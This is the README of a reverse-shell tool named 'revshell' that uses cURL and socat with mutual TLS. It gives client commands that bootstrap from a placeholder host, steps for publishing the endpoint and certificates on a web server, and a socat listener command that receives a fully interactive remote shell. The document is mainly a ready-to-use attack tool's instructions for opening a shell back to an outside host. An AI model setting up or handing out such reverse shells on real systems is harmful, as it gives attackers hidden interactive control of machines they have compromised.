# revshell
#### Unsneaky and somewhat ghetto reverse shell with mutual TLS authentication, using cURL and socat

## Introduction
This simple reverse shell can be used to establish an encrypted and authenticated connection back to your remote host.  
Besides that, you even get a fully interactive shell - tab complete all day long, if you wish to do so.  
  

The reverse connection is configured using a bootstrap URL, provided either by a command line argument or environment variables.  

## Usage

### Client - Command line argument
```
$ revshell "https://example.com/bd7751b6ec39"
```

### Client - Environment variables
```
$ export REVSHELL_BOOTSTRAP_URL="https://example.com"; export REVSHELL_BOOTSTRAP_TOKEN="bd7751b6ec39"
$ revshell
```

### Bootstrap provider
```
$ mkdir /var/www/html/bd7751b6ec39
$ echo -n "example.com:443" > /var/www/html/bd7751b6ec39/endpoint
$ cp ca/keys/ca.crt /var/www/html/bd7751b6ec39/ca
$ cat ca/keys/example.com.crt ca/keys/example.com.key > /var/www/html/bd7751b6ec39/cert
```

### Server
```
$ cat ca/keys/example.com.crt ca/keys/example.com.key > ca/keys/server.pem
$ socat file:`tty`,raw,echo=0 openssl-listen:443,reuseaddr,cert=ca/keys/server.pem,cafile=ca/keys/ca.crt
```
